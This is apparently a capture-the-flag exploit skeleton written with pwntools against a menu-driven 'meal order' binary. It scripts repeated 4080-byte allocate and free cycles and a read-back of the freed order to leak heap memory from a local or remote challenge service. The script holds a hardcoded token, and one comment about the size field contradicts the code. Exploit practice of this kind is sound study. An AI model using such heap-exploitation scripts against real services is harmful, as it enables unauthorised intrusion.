#!/usr/bin/env python3
from pwn import *
import os

# -------------------------------------------------
# setup
# -------------------------------------------------
path = args.BINARY or "./tc0"

context.log_level = "error"  # change to 'info' or 'error' if too noisy
exe = context.binary = ELF(path)
libc = ELF("./libc.so.6") if args.REMOTE else exe.libc

HOST, PORT = "192.168.0.211", 1337
if os.getenv("container"):
    HOST = "host.containers.internal"
if os.getenv("SSH_CONNECTION"):
    HOST = "127.0.0.1"
TOKEN = "e0474f5b11ef48439fec9f14c439c514"


def start():
    """
    Start the process locally, or connect remotely with:
      python exploit.py REMOTE
    """
    if args.REMOTE:
        host = args.HOST or HOST
        port = int(args.PORT or PORT)
        token = args.TOKEN or TOKEN
        io = remote(host, port)
        io.sendlineafter(b"please input hash value: ", token)
        io.sendlineafter(b"option :", b"4")
        return io
    else:
        return process(exe.path)


# -------------------------------------------------
# helpers for the menu
# -------------------------------------------------


def choose(io, payload: bytes):
    """
    Send a whole 'choice' blob after the main prompt.
    For simple choices, payload is just b'!' / b'@' / b'#' / b'$'.
    For the order option we stuff size+data right after '!' in one go.
    """
    io.sendafter(b"ready to order :", payload)


def make_order(io, size: int, data: bytes):
    """
    <!> Order a set meal

    Binary seems to:
      read(4) for size
      read(size) for details
    So we send: '!' + 4-byte size string + data
    """
    #  assert len(data) == size, "len(data) must equal size"

    size_str = f"{size:09d}".encode()  # e.g. 8 -> b'0008'

    choose(io, b"!xxx")
    io.sendafter(b"meal size : \n", size_str)
    io.sendafter(b"details : \n", data)


def cancel_order(io, idx: int | str):
    """
    <@> Cancel order
    Prompts with: 'Index :'
    """
    choose(io, b"@xxx")
    io.sendlineafter(b"Index :\n", str(idx).encode())


def show_order(io, idx: int | str):
    """
    <#> List order
    Prompts with: 'Index :'
    """
    choose(io, b"#xxx")
    io.sendlineafter(b"Index :\n", str(idx).encode())
    # You can now parse whatever it prints:
    # leak = io.recvuntil(b"+++++++++++++++++++++++++++++++", drop=True)
    # return leak


def goodbye(io):
    """
    <$> Goodbye !
    """
    choose(io, b"$xxx")


def recv(io):
    return io.recvuntil(b"+++++++++++++++++++++++++++++++", drop=True)


# -------------------------------------------------
# demo / main exploit skeleton
# -------------------------------------------------


def main():
    io = start()

    data = b''

    for _ in range(16):
        make_order(io, 4080, b"A" * 4080)
        cancel_order(io, 0)

    make_order(io, 4080, b"ABCD" * 1020)

    show_order(io, 0)
    data += recv(io)

    cancel_order(io, 0)

    io.close()

    print(data)


if __name__ == "__main__":
    main()
